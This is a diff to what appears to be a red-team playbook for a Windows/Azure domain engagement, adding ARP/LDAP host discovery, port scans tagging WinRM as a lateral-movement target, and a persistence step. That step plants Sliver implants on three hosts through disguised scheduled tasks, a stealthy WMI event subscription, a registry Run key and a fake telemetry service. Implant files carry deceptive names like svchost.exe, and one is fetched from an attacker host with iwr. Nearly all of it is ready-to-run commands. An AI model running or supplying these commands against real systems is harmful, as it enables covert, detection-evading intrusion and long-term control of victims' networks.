@@ -394,14 +394,32 @@ sa-driversigs
 sa-enum-filter-driver
 ```
 
-### Port Scan
+### Host Discovery + Port Scan
+
+How we find hosts — ARP scan the subnet, then port scan discovered IPs:
 
 ```
-portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135
-portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
-portscan --host 10.1.0.25 --ports 445,5985,3389
-portscan --host 10.1.0.20 --ports 445,5985,3389
+# ARP scan to discover live hosts on the subnet
+sa-arp
+
+# Or enumerate from AD (all domain computers with IPs)
+sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem
+
+# Or quick ping sweep via execute
+execute -o powershell -c "1..254 | % { $ip='10.1.0.'+$_; if(Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { Write-Output $ip } }"
+
+# Port scan discovered hosts
+portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135    # DBServer
+portscan --host 10.1.0.5 --ports 445,5985,3389,88,389,636    # DC
+portscan --host 10.1.0.25 --ports 445,5985,3389              # EntraConnect
+portscan --host 10.1.0.20 --ports 445,5985,3389              # FileServer
 ```
+
+Key findings:
+- Port **5985** (WinRM) = lateral move target via evil-winrm
+- Port **1433** (SQL) = database access
+- Port **88** (Kerberos) = confirms DC
+- Port **3389** (RDP) = can RDP if needed
 
 ---
 
@@ -710,6 +728,115 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServ
 
 ---
 
+
+---
+
+## Step 13: Persistence (Different Method Per Hop)
+
+Each hop gets a different persistence method to avoid single-point detection.
+
+### 13a: httpserver — Scheduled Task (schtasks)
+
+```powershell
+# From Sliver session or RunCommand on httpserver
+# Create a scheduled task that runs the implant at boot + every 15 min
+schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" `
+  /tr "C:\ProgramData\Microsoft\Network\teams.exe" `
+  /sc onstart /ru SYSTEM /f
+
+schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSAT" `
+  /tr "C:\ProgramData\Microsoft\Network\teams.exe" `
+  /sc minute /mo 15 /ru SYSTEM /f
+
+# Verify
+schtasks /query /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /v /fo list
+```
+
+### 13b: DBServer — WMI Event Subscription
+
+```powershell
+# From evil-winrm session on DBServer
+# WMI permanent event subscription — survives reboots, very stealthy
+
+# First upload implant to DBServer
+upload ~/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe
+
+# Create WMI event filter (triggers 5 min after boot)
+$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
+  -Arguments @{
+    Name = "WindowsParityFilter"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
+  }
+
+# Create consumer (runs the implant)
+$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
+  -Arguments @{
+    Name = "WindowsParityConsumer"
+    CommandLineTemplate = "C:\ProgramData\Microsoft\Network\svchost.exe"
+  }
+
+# Bind filter to consumer
+Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
+  -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+  }
+
+# Verify
+Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
+Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer
+```
+
+### 13c: DC — Registry Run Key + Service
+
+```powershell
+# From RunCommand on DC (already SYSTEM)
+# Method 1: Registry Run key
+$regPersist = @'
+# Upload implant first via RunCommand
+iwr http://YOUR_KALI_IP:8080/teams-dc.exe -OutFile C:\ProgramData\Microsoft\Network\DiagTrack.exe -UseBasicParsing
+
+# Registry Run key (runs at every user logon)
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+  -Name "DiagnosticsTrackingService" -Value "C:\ProgramData\Microsoft\Network\DiagTrack.exe" `
+  -PropertyType String -Force
+
+# Method 2: Create a Windows service (runs at boot as SYSTEM)
+New-Service -Name "DiagTrack2" `
+  -BinaryPathName "C:\ProgramData\Microsoft\Network\DiagTrack.exe" `
+  -DisplayName "Diagnostics Tracking Service 2" `
+  -StartupType Automatic `
+  -Description "Connected User Experiences and Telemetry secondary service"
+
+Start-Service DiagTrack2
+
+# Verify
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Select DiagnosticsTrackingService
+Get-Service DiagTrack2
+'@
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $regPersist
+```
+
+### Persistence Cleanup (When Engagement Ends)
+
+```powershell
+# httpserver — remove schtask
+schtasks /delete /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /f
+schtasks /delete /tn "\Microsoft\Windows\Maintenance\WinSAT" /f
+
+# DBServer — remove WMI subscription
+Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*Parity*' } | Remove-WmiObject
+Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject
+Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject
+
+# DC — remove service + reg key
+Stop-Service DiagTrack2 -Force; Remove-Service DiagTrack2
+Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagnosticsTrackingService" -Force
+```
 ## Troubleshooting
 
 ### Implant blocked by Defender
